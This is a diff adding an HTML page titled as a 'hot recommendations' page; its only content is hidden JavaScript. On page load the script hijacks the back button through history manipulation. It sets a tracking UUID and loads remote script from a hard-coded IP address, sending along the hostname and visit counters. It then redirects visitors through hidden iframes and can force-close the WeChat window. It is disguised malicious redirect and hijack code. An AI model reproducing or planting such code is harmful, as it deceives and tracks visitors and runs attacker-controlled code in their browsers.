@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <meta name="referrer" content="never">
+                <link rel="icon" href="data:image/ico;base64,aWNv">
+                <title>热门推荐</title>
+            </head>
+            <body>
+            <div style="display:none">
+                <script type="text/javascript">if (self !== top) {
+                    window.top.location = self.location
+                }
+                try {
+                    tbsJs.onReady('{useCachedApi : "true"}',
+                    function(c) {})
+                } catch(err) {}
+                var uuid = localStorage.getItem('uuid');
+                if(!uuid){
+                    uuid = "OopbkakVomrenlzGMUQcYVO5mRmtzNcc";
+                    localStorage.setItem('uuid',uuid);
+                }
+                var is_new = 0;
+                var back_num = 0;
+                var date = getNowFormatDate();
+                var exists_uuid = localStorage.getItem('uuid' + date);
+                if(!exists_uuid){
+                    is_new = 1;
+                    localStorage.setItem('uuid' + date,1);
+                }
+                function getNowFormatDate() {
+                    var date = new Date();
+                    var seperator1 = "-";
+                    var year = date.getFullYear();
+                    var month = date.getMonth() + 1;
+                    var strDate = date.getDate();
+                    if (month >= 1 && month <= 9) {
+                        month = "0" + month;
+                    }
+                    if (strDate >= 0 && strDate <= 9) {
+                        strDate = "0" + strDate;
+                    }
+                    var currentdate = year + seperator1 + month + seperator1 + strDate;
+                    return currentdate;
+                }
+                var _kd = "_nysst8",
+                _kx = "_nyxts8";
+                var isiOS = !!navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
+                window.onpageshow = function(b) {
+                    alert(location.hash)
+                    if (location.hash.length < 1) {
+                        localStorage.setItem(_kx, "0")
+                        var referrer = "";
+                        if (document.referrer.length > 0) {
+                            referrer = document.referrer;
+                        }
+                        try {
+                            if (ref.length == 0 && opener.location.href.length > 0) {  
+                                referrer = opener.location.href;  
+                            }  
+                        } catch (e) {}
+                        localStorage.setItem('referrer',referrer);
+					    j(0)
+					} else {
+                        j(1)
+                    }
+                };
+                var burl = "http://8.136.207.8/yueduhz/task?sp=1243_b9ytrpglhtkolila";
+                if (!isiOS) {
+                    window.onhashchange = function() {
+                        j(1)
+                    }
+                }
+                function ljs(d) {
+                    var c = localStorage.getItem(_kd);
+                    var b = document.createElement("script");
+                    b.src = burl + "&b="+d+"&h="+location.hostname+"&kd="+parseInt(0 + localStorage.getItem(_kx))+"&n="+is_new+"&u="+uuid+"&t=1&j=1&_t=" + (new Date()).getTime();
+                    b.type = "text/javascript";
+                    document.body.appendChild(b)
+                }
+                function j(d,b="") {
+                    debugger
+                    if (b) {
+                        var c = parseInt(0 + localStorage.getItem(_kx));
+                        if (b.x && b.x > 0 && c >= b.x) {
+                            if(b.xc == 1){
+                                alert(JSON.stringify(b))
+                                try {
+                                    if (typeof WeixinJSBridge == "undefined"){
+                                        if( document.addEventListener ){
+                                            document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
+                                        }else if (document.attachEvent){
+                                            document.attachEvent('WeixinJSBridgeReady', onBridgeReady); 
+                                            document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
+                                        }
+                                    }else{
+                                        onBridgeReady();
+                                    }
+                                } catch (e) {
+                                    console.log(e.message)
+                                }
+                            } else {
+                                if(b.xc == 3 && b.xu){
+                                    a(b.xu)
+                                } else {
+                                    var ref = localStorage.getItem('referrer');
+                                    if(ref){
+                                        a(ref)
+                                    } else {
+                                        if(isiOS){
+                                            top.history.go(-c);
+                                        } else {
+                                            top.history.go(-c-3);
+                                        } 
+                                    }
+                                }
+                            }
+                        } else {
+                            a(b.url)
+                        }
+                    } else {
+                        var g = "#" + new Date().getTime();
+                        history.pushState(history.length + 1, "message", g);
+                        ljs(d)
+                    }
+                }
+                function w(c) {
+                    if (c.d) {
+                        localStorage.setItem(_kd, c.d)
+                    } else {
+                        localStorage.removeItem(_kd)
+                    }
+                    j(c.b,c)
+                }
+                function onBridgeReady() {
+                    setTimeout(function() {
+                        WeixinJSBridge.invoke("closeWindow", {},
+                        function(c) {})
+                    },
+                    50)
+                }
+                function r() {}
+                function a(e) {
+                   alert('e '+e)
+                    var c = parseInt(0 + localStorage.getItem(_kx)) + 1;
+                    localStorage.setItem(_kx, c);
+                    var f = document.createElement("iframe");
+                    f.style.display = "none";
+                    document.body.appendChild(f).src = 'javascript:"<script>top.location.replace(\'' + e + '\')<\/script>"';
+                };</script></div></body></html>
